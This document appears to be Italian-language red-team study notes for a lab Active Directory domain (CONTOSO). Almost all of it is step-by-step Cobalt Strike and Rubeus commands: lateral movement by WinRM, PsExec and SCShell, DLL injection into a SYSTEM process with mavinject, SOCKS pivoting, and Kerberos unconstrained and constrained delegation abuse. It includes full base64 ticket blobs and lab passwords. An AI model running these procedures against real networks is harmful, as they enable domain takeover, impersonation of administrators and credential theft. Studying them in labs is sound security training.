#Usi jump per muoverti lateralmente verso il sistema lon-ws-1 usando WinRM (architettura 64-bit).
beacon> jump winrm64 lon-ws-1 smb

#Viene eseguito il comando net sessions su lon-ws-1 tramite WinRM.
beacon> remote-exec winrm lon-ws-1 net sessions


#esempi comandi
remote-exec winrm lon-ws-1 whoami
remote-exec winrm lon-ws-1 net user
remote-exec winrm lon-ws-1 net sessions
remote-exec winrm lon-ws-1 ipconfig /all
##########################################
#Esempio StepByStep
# 1. Esegui beacon su host remoto via WinRM (fileless)
jump winrm64 <target> smb

# 2. Esegui comandi con output sul sistema remoto
remote-exec winrm <target> <command>

# Esempi:
remote-exec winrm <target> whoami
remote-exec winrm <target> net sessions
remote-exec winrm <target> ipconfig /all

##########################################

#Usa Service Control Manager (SCM) per creare un servizio temporaneo sul sistema remoto (lon-ws-1
beacon> jump psexec64 lon-ws-1 smb

#Crea un servizio temporaneo e carica il beacon
#Necessita accesso amministrativo al target (SMB/ADMIN$).
#-->Usalo solo se accetti il rischio di rilevamento.
beacon> jump psexec64 <target> smb


##########################################
# 1. Esegui beacon su host remoto usando Service Control Manager
jump psexec64 <target> smb

# Beacon eseguito come SYSTEM
# Payload scritto in \\<target>\ADMIN$\xxxx.exe

##########################################


#SCS
Cobalt Strike > Script Manager > Load: scshell.cna

# Usa un servizio esistente per eseguire beacon.
beacon> jump scshell64 <target> smb
#Esempi
jump scshell64 lon-ws-1 smb
jump scshell64 10.10.120.10 smb

#--> la migliore "rumorosità" è quella di WinRm64

##########################################
# 1. Carica Aggressor Script scshell.cna
Cobalt Strike > Script Manager > Load > scshell.cna

# 2. Esegui beacon su host remoto usando un servizio esistente modificato temporaneamente
jump scshell64 <target> smb

# Il servizio originale viene modificato, usato, e poi ripristinato.
# Nessun nuovo servizio viene creato.
##########################################

#LOLBAS
#Sono binari, script o librerie firmate da microsoft e preinstallate

#Enumerare i processi remoti con WinRM
beacon> remote-exec winrm <target> Get-Process -IncludeUserName | select Id, ProcessName, UserName | sort -Property Id

#esempio
remote-exec winrm lon-ws-1 Get-Process -IncludeUserName | select Id, ProcessName, UserName | sort -Property Id
#questo identifica un processo ad esempio
Id          : 1992
ProcessName : spoolsv
UserName    : NT AUTHORITY\SYSTEM

#carico DLL sul sistema
beacon> cd \\lon-ws-1\ADMIN$\System32
beacon> upload C:\Payloads\smb_x64.dll

#WMI per lanciare il file con la dll. In questo esempio si inietta smb_x64.dll nel processo con PID 1992.

beacon> remote-exec wmi lon-ws-1 mavinject.exe 1992 /INJECTRUNNING C:\Windows\System32\smb_x64.dll

#Collego beacon nato dall'injection
beacon> link lon-ws-1 TSVCPIPE-xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx

#Recap a step

##########################################
# 1. Trova processo remoto SYSTEM
remote-exec winrm <target> Get-Process -IncludeUserName | select Id, ProcessName, UserName | sort -Property Id

# 2. Carica DLL
cd \\<target>\ADMIN$\System32
upload C:\Payloads\smb_x64.dll

# 3. Inject via mavinject
remote-exec wmi <target> mavinject.exe [PID] /INJECTRUNNING C:\Windows\System32\smb_x64.dll

# 4. Collega beacon
link <target> TSVCPIPE-xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
##########################################


#LogonType vs Autenticazione

##########################################
# 1. Muoviti lateralmente con WinRM o PsExec
jump winrm64 lon-ws-1 smb

# 2. Prova ad eseguire una query LDAP (PowerView)
powershell-import PowerView.ps1
powerpick Get-DomainTrust

# 3. Il comando fallisce → manca un TGT nel beacon
# Nessuna autenticazione LDAP possibile

# 4. Verifica tipo di ticket presente
kerberos_ticket_list

# 5. Se hai solo HTTP/<host> → sei loggato come Network Logon (senza TGT)

# 6. Soluzioni:
make_token CONTOSO\admin password123
# oppure
ptt C:\Tickets\tgt_admin.kirbi

# 7. Ritenta il comando:
powerpick Get-DomainTrust
##########################################

```


## Pivoting

```bash
#ADD dns
Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value '10.10.120.20 lon-db-1'


#Avvio socksProxy
beacon> socks 1080

#tool Proxifier

#Autenticazione proxy:
#plaintest
$Cred = Get-Credential CONTOSO.COM\rsteel
Get-ADUser -Filter 'ServicePrincipalName -like "*"' -Credential $Cred -Server lon-dc-1

#Kerberos Tickets (.kirbi) + Rubeu
Rubeus.exe createnetonly /username:rsteel /password:FakePass /ticket:rsteel.kirbi /show

ipmo ActiveDirectory
Get-ADUser -Filter 'ServicePrincipalName -like "*"' -Server lon-dc-1

```


## Kerberos

```bash
#Ricerca Uncostrain Delegation
beacon> ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname


#Rubeus può “ascoltare” e catturare TGT in tempo reale quando gli utenti si autenticano.
#Rubeus monitor
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap

#per arrestarlo
#elenca i job
jobs

#killa il job selezionato
jobkill 0

##########################################
#Vedo su quali computer è configurata l'uncostrained delegation
ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname

#Mi muovo su uno di loro
make_token CONTOSO\rsteel Passw0rd!
jump psexec64 lon-ws-1 smb

#dal nuovo beacon runno rubeus
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap

#trovato il ticket lo copio e lo injectio
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:dyork /password:FakePass /ticket:doIFjjCCBYqgAwIBBaEDAgEWooIEmTCCBJVhggSRMIIEjaADAgEFoQ0bC0NPTlRPU08uQ09NoiAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTaOCBFMwggRPoAMCARKhAwIBAqKCBEEEggQ9MQd9Ydm9uCk/6tgshGHI+INT3Jusnqiype6LbCoTmrYUqcr7rCp4R9gLEIggGN6GTMQlw9Pr4JFVimsavdb8LySKsrXP/00AAgAMD2sI1rWO9WCYb0Mh15PK4BKaLinjKj5ByQJQfrrFHzX+wz+DrpNaonJkDiAPQYuyZwxqRVvW3RXRcGfiX/EgNkwHaS6q0xWznfJDMw1L8HB7dI9WVcV78STeEFLVdHgB16mbtyZtZGLdcExxS4I6o8G9kpqWxj+NnwFiauxyyYRSK1ly25VnK+/c7YH+I2A40rTIfGMb4ukXDUvQm6bRsl+18sFZenqa0VbbSSrnBQ815829sgsdPOmuqwXdwRntG2BuSXAA0/CcMK6HEoPJg8uMA+LkBB/VFR5P9fidmHj0vN9hiWt7TXvqKYC6ZTGQeL4Q7jleb/XyLDrslfn5Nb/0RMIN6ZNVh60dUq6P8Znhf1xxKyd9adKNeDFA+VapRG+Y1/ymy/DcfThYcCuDad6hXBY/XqVEcdh9TNOPURWAbpw3EVH07dPi5xm9PTwuQmSyrjf4d74twQZJdqqaGzSs18/hQzJQGRfrGSgv+RyKl70fxll+LV5MI4T7v3mi08Dt7U1XtJT+iR6XmDBGB4WwIh45EViQPDwn8NCvFdBelIqdh2HiMsQ/56o7FG8UCuhIoNd3dSZU/CpA8h2pLQWAx5ZIOjHP6wNE/UfoQbmD8QB/st5aC6fJRFw1VRMzG2bpznAkZAmj2bEem4wOx3l1M3KAndB7EUG7lhN1oFQXQnkAvWsX+vu8Pyac0BxamvIwRSMBWuuaq35SJSDPI7fXFh64TpvKgvsfGX2rkiXbVVIIdyWfWiC7MzHKJhNItH/YopAH6g9SONiFXUjRlU9b78rLPL2c5Ht5cCLPb+fGEPdkH7XfrdPhOgJ+az5nIt8apUHB9Z3B712Uc6l6Vh5cgMj2brmQ8Gj8FuxBYyXwKKbqfN/qUYfTke9Rnv0Fm9gko9GXRHfKzdtPIMD0kia1+ht4EmtIIrdyoTmC3Z0PAvMsBxqqUJ/Z5u5wkoNT/izKAuuoT6UfiugKEkaU4w+DSBMMHn6CDw4bvPtfITuEaY9rJ2O7j6trgZARs50gIa7KKblUpgiYWGzs5BH2kQGpY8hrtHHS15k6XS2S8MBQe7IkQ8wTEueGhnQKb6njE+S7Kw58T7nOXeJmkjbq5Urhi/pr2eioW883VuuC9cL34aqfeAjWA2OPmwsjoNjcaWnffOuisptwW159RbeHEMptiwhdbPFS3C4atJ304IUcr83PBey9FRpIjnqOw6HymFaLwUoj43EOc27+zfNbSmnVBg3DDrJVssC/7+vlJxjDbV0xu13XiPyE8P8T9LiM+HPhh37vHPgFHKijoTdZUimmUKMoiXjiULI6M5W+6DK3PNT5ZYBpxB7KBjfuMaOrTAujgeAwgd2gAwIBAKKB1QSB0n2BzzCBzKCByTCBxjCBw6ArMCmgAwIBEqEiBCArsSZsp1bUPz/LXWkg/Nd4erdDoc4Mh0MuHyaSJRz61KENGwtDT05UT1NPLkNPTaISMBCgAwIBAaEJMAcbBWR5b3JrowcDBQBgoQAApREYDzIwMjUwODEyMTQ1MTU4WqYRGA8yMDI1MDgxMzAwNTE1NVqnERgPMjAyNTA4MTkxNDUxNTVaqA0bC0NPTlRPU08uQ09NqSAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTQ==

#ora ha creato il processo e mi ci collego
steal_token 1968

#check se ci sta il ticket
run klist

vedo se posso accedere al dc
ls \\lon-dc-1\c$
##########################################
#spiegazione constrain
S4U2self → Ti scrivi da solo una "delegation letter" dicendo: "Io sono Mario Rossi" e il KDC ti crede (se hai il permesso).
S4U2proxy → Con quella lettera vai alla reception di un altro edificio e dici: "Ecco la prova che sono Mario Rossi, fammi entrare."

#Enumerazione Constrained Delegation
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo

#questo sotto significa che lon-ws-1 può delegare verso CIFS su lon-fs-1
sAMAccountName: LON-WS-1$
msDS-AllowedToDelegateTo: cifs/lon-fs-1.contoso.com, cifs/lon-fs-1

#rubeus
Rubeus.exe s4u /user:<computer$> /msdsspn:<servizio_target> /ticket:<TGT_computer> /impersonateuser:<utente>

#rubeus senzaa protocol transition
Rubeus.exe s4u /user:<computer$> /msdsspn:<servizio_target> /ticket:<TGT_computer> /tgs:<ticket_utente>

##########################################
#Cerco computer che hanno alowtodelegateto
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo

#ottenere UAC per lon-ws-1
ldapsearch (&(samAccountType=805306369)(samaccountname=lon-ws-1$)) --attributes userAccountControl
# capisci se su quella macchina puoi fare attacco Constrained Delegation + Protocol Transition (S4U2self + S4U2proxy) o se sei limitato
[Convert]::ToBoolean(16781312 -band 16777216)

#lateral movement sulla vm
make_token CONTOSO\rsteel Passw0rd!
jump psexec64 lon-ws-1 smb

#Dump del TGT da lon-ws
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap

#eseguire S4U
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:doIFfjCCBXqgAwIBBaEDAgEWooIElTCCBJFhggSNMIIEiaADAgEFoQ0bC0NPTlRPU08uQ09NoiAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTaOCBE8wggRLoAMCARKhAwIBAqKCBD0EggQ5H9GGfzOEvDFG7N8lw8nH6Nz8DjurKxl5L9yNbBq6Da6owxXqhtYjWvtvpedV1RNuPFAWFsyyTuc1GxRTCal3yn3gYAB578+I566+yAPo86elKenXda6UG4IBAEtJq8ZZUEX+9hIVqTeyChyQU65xmiFJzEK3CBu77qFQ1+h2rG8MnF63RQDGLafoFYLBQYtiva10KwvQo/m+2qnlf4gV9F0GKvTE8hJ33WuhWC58YAfOMzLdRY9N249PSJUx1DE9pjSKq/yId1gMVbTs6EBDMLpsiRRd66V3Tg7fjsnruHvAFFbtyLhJupmEd0qNfMGubH7i4kbwaSb4OvUFOebPdUNJz661ovAWvWMImVciJLiSl/DUP4EgapBCaWhzZmtKVBInvmhwnKTXh+/0v7B8dtPqaJO9/uN1D9u3kpk4N/P76gq5PF8ADjQ97Ef2631hdlJWsipJOZLwWAcbQW9NyrkBMKjoSxv2mOq9qa7bE/KACCwPbH+GscAW/t++a5wUC6DT6FW2oCPXBQRGVuXcQnpLFts3Kbz73gRHL76z+eBSY9++UDYTN9M687RzRTd6a+AtsVeBQDwvksomMfdvMMVpruRU+kPKxZz60UR355cP/RqSyCmwP80l/oogg8lU3znX1NV4IonkkBn9c66Z8FZc2vlo+i46wAdwkKlMaz2Y0z127+ieGenZD0F9OaG6EJ/DV3CG+0NjBMw7H6tkfCdRA3BjMjcAEcVd39Blbia4Sz28R8Ftfuf7F1GKTSNHFag7L+RKcLeGi4ClyULZ9W0JzTLWGfUf1r3jVC9tD9JOM+5AwKCfD5ZmR5BzRIRc+5qyvTw6mg9ARaUv6VWcwwYQwkS/Seg5wHh5NQOG9VwjLVugWG2OIr0jfqDlYiqencCrGjCnZBb3g3L5yAbU4395xEcvt4eUW4rnUnMkZz2TAsrOOYKeM9wmkgzNrBJv7CWxApnt4kjKWiN+e+P50f5Fr2sy2RBMo+ZSncIyaFd8JZseHIQnxQk5rmMdsx6br1v8+Zx1c5LDPn4jDbmTe9MCkIfS9UZJNQoAjNL9Sei5kYOtelmjeZv1o9bXj0QTuesZS1B59u9eX9gKuY3g9QUGF7PRAqHvN8l3ufgodEwmEdjlRygD9M2sVTOLIWM+amTCznskQWCeQSfmofC6G57FajDFkmq12p6JELWRsvjAZZh8b6awG+N83H+Eet+V2jsdj5iMGKM5Ef3DC0hkEX5gqJzVjvnYAswJVfV4rp5t7EHqMtL9nGQkT+kc3RLQ2Qw6iGM9ZAt9QbDeNmZFelfXLN1p2xS/yaYEFrS/hqCha0TfHHr6ftnYvIhxe9QSMMRz92yQKc4q36qK/G/n5LY2Gcau2ooHIJ5NgqaiGL4hzyVc6XxP6duuqwMPuwdLnjqcThmfG5N+k7+oQjB1k5o7qEJFcbmt0KOB1DCB0aADAgEAooHJBIHGfYHDMIHAoIG9MIG6MIG3oBswGaADAgEXoRIEELH/xc0GkWESaugUiNjMQdWhDRsLQ09OVE9TTy5DT02iFjAUoAMCAQGhDTALGwlMT04tV1MtMSSjBwMFAGChAAClERgPMjAyNTA4MTIxNjAwNDVaphEYDzIwMjUwODEzMDE1MjMwWqcRGA8yMDI1MDgxOTE1NTIzMFqoDRsLQ09OVE9TTy5DT02pIDAeoAMCAQKhFzAVGwZrcmJ0Z3QbC0NPTlRPU08uQ09N /impersonateuser:Administrator /nowrap

#injecto il ticket dentro il logon session
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket: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

#prendo il token
steal_token 3996
#guardo se ci sta il ticket
run klist
#checkop se funziona
ls \\lon-fs-1\c$
##########################################

```
